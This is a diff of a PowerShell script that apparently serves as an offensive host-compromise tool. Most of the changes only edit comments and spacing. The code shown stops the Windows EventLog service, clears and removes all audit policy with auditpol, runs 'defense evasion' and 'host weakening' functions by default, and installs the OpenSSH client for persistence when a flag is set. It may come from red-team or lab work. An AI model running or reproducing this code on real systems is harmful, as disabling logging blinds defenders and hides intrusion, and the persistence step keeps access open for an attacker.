@@ -12,10 +12,9 @@ $outFilePath = "./configs.txt"
 $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 
 function defenseEvasion {
-
    $global:logString = $global:logString + "---------- DEFENSE EVASTION ----------`n"
 
-    #Stop Windows Event logging and audit policy logging. Source https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/impair-defenses/disable-windows-event-logging
+    #Stop Windows Event logging Source https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/impair-defenses/disable-windows-event-logging
     try {
         Stop-Service -Name EventLog -Force -ErrorAction Stop
         $global:logString = $global:logString +  "Windows event logging disabled. `n"
@@ -24,6 +23,7 @@ function defenseEvasion {
         $global:logString = $global:logString +  "ERROR: Unable to stop Windows Event logging `n"
     }
 
+    # Disable audit policy logging.
     try {
         auditpol.exe /clear /y
         auditpol.exe  /remove /allusers
@@ -199,7 +199,6 @@ function persist {
     # Install SSH client on the host
     try {
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction Stop
-    # Enable SSH service + modify the service to start automatically
    $global:logString = $global:logString +  "SSH client installed. `n"
     }
     catch {
@@ -218,21 +217,22 @@ function persist {
    }
 }
 
-
 # Main Execution
 $global:logString = $global:logString +  ".......... BEGINNING NEW CONFIG ............`n"
 $global:logString = $global:logString +  "TIMESTAMP: " + $timestamp + "`n"
 
+# Show Help menu if help tag is applied
 if ($arg0 -eq "--help") {
     showHelp
     Exit
 }
 
+# Execute core functions
 defenseEvasion
 weakeningHost
 
+#Execute persistence if the persist tag is applied
 if ($arg0 -eq "--persist" -or $arg1 -eq "--persist" ) {
-
     persist
 }
 
